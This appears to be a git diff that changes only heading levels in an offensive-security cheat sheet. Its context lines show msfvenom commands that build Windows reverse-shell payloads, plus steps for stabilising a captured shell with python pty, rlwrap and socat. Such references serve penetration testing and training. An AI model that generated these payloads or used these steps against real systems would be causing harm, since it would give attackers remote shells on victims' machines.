@@ -49,9 +49,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 ```
 
-#### Shell Stabilisation
+## Shell Stabilisation
 
-##Technique 01: Python
+#### Technique 01: Python
 ```
 ➤ Step 01 : uses Python to spawn a better featured bash shell
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -86,7 +86,7 @@ user@box:~$ ^C
 user@box:~$
 ```
 
-## Technique 02: Rlwrap
+#### Technique 02: Rlwrap
 rlwrap gives a more fully featured shell including access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
 This technique is particularly useful with the Windows shell.
 ```
@@ -104,7 +104,7 @@ CRTL+Z
 stty raw -echo; fg
 ```
 
-Technique 3: Socat
+#### Technique 3: Socat
 Restricted to Linux target
 ```
 ➤ Step 01: Transfer a socat static compiled binary (e.g., using python http.server)
